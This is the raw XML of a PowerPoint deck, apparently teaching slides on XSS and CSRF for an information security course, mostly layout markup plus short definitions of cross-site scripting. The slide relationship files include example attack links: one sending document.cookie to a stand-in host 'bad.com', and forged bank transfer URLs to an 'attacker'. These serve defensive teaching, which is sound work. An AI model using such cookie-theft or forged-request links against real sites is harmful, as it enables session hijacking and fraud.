          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl3pPr>
      <a:lvl4pPr algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl4pPr>
      <a:lvl5pPr algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl5pPr>
      <a:lvl6pPr marL="402724" algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl6pPr>
      <a:lvl7pPr marL="805449" algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl7pPr>
      <a:lvl8pPr marL="1208171" algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl8pPr>
      <a:lvl9pPr marL="1610895" algn="ctr" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl9pPr>
    </p:titleStyle>
    <p:bodyStyle>
      <a:lvl1pPr marL="302575" indent="-302575" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl1pPr>
      <a:lvl2pPr marL="400632" indent="2802" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl2pPr>
      <a:lvl3pPr marL="804065" indent="2802" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl3pPr>
      <a:lvl4pPr marL="1207498" indent="2802" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl4pPr>
      <a:lvl5pPr marL="1608130" indent="5603" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr>
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl5pPr>
      <a:lvl6pPr marL="2013621">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl6pPr>
      <a:lvl7pPr marL="2416346">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl7pPr>
      <a:lvl8pPr marL="2819070">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl8pPr>
      <a:lvl9pPr marL="3221792">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl9pPr>
    </p:bodyStyle>
    <p:otherStyle>
      <a:lvl1pPr marL="0">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl1pPr>
      <a:lvl2pPr marL="402724">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl2pPr>
      <a:lvl3pPr marL="805449">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl3pPr>
      <a:lvl4pPr marL="1208171">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl4pPr>
      <a:lvl5pPr marL="1610895">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl5pPr>
      <a:lvl6pPr marL="2013621">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl6pPr>
      <a:lvl7pPr marL="2416346">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl7pPr>
      <a:lvl8pPr marL="2819070">
        <a:defRPr>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl8pPr>
      <a:lvl9pPr marL="3221792">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png"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout19.xml"/><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png"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout19.xml"/><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png"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout19.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image13.jpeg"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image12.png"/><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8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image13.jpeg"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image15.jpeg"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image12.png"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image14.png"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout20.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image11.png"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image10.jpeg"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image9.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide19.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image13.jpeg"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image15.jpeg"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image12.png"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image14.png"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout20.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image11.png"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image10.jpeg"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image9.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide20.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image13.jpeg"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image15.jpeg"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image12.png"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image14.png"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout20.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image11.png"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image10.jpeg"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image9.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide21.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image13.jpeg"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image15.jpeg"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image12.png"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image14.png"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout20.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image11.png"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image10.jpeg"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image9.png"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image16.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide22.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image13.jpeg"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image15.jpeg"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image12.png"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image14.png"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout20.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image11.png"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://bad.com/steal?c=document.cookie" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image10.jpeg"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://bank.com/transfer?amt=9999&amp;amp;to=attacker" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image9.png"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image1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4.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4.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide2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30.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://bank.com/transfer.cgi?amt=9999&amp;amp;to=attacker" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout29.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide31.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png"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout35.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image20.jpeg"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image19.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide32.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png"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout35.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image19.png"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image20.jpeg"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image21.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide33.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png"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout35.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image20.jpeg"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image21.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide34.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png"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout35.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image20.jpeg"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image21.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide35.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png"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout35.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image19.png"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image20.jpeg"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image21.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide36.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image15.jpeg"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://habibbank.com/" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image14.png"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout35.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image19.png"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image20.jpeg"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image21.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide37.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5.jpeg"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://habibbank.com/" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image14.png"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout35.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image19.png"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image20.jpeg"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image24.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image21.png"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image23.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide38.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://habibbank.com/" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image14.png"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image19.png"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="../notesSlides/notesSlide1.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout35.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image20.jpeg"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image24.png"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image21.png"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image23.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image15.jpeg"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image22.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide39.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://habibbank.com/" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image14.png"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image19.png"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="../notesSlides/notesSlide2.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout35.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image20.jpeg"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image24.png"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image21.png"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image23.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image15.jpeg"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image2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jpeg"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout3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4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xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout44.xml"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide4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xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout4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5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5.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout4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XSS and CSRF</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Subtitle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Information SECURITY</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="15305552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XSS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text Placeholder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391124" y="1605283"/>
            <a:ext cx="5278362" cy="4456850"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" cap="none" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Cross-site scripting (XSS) is an attack in which an attacker injects malicious executable scripts into the code of a trusted application or website.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" cap="none" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Attackers often initiate an XSS attack by sending a malicious link to a user and enticing the user to click it.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="111C24"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>If the app or website lacks proper data sanitization, the malicious link executes the attacker’s chosen code on the user’s system. As a result, the attacker can steal the user’s active session cookie.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:latin typeface="+mj-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{56E90A38-B1BF-454F-A0C4-5401CDA122E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>2</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="21724586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Cross Site Scripting </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Cross-site Scripting (XSS) is a client-side code injection attack. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The attacker aims to execute malicious scripts in a web browser of the victim by including malicious code in a legitimate web page or web application. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The actual attack occurs when the victim visits the web page or web application that executes the malicious code. The web page or web application becomes a vehicle to deliver the malicious script to the user’s browser. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Vulnerable vehicles that are commonly used for Cross-site Scripting attacks are forums, message boards, and web pages that allow comments. </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{56E90A38-B1BF-454F-A0C4-5401CDA122E6}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
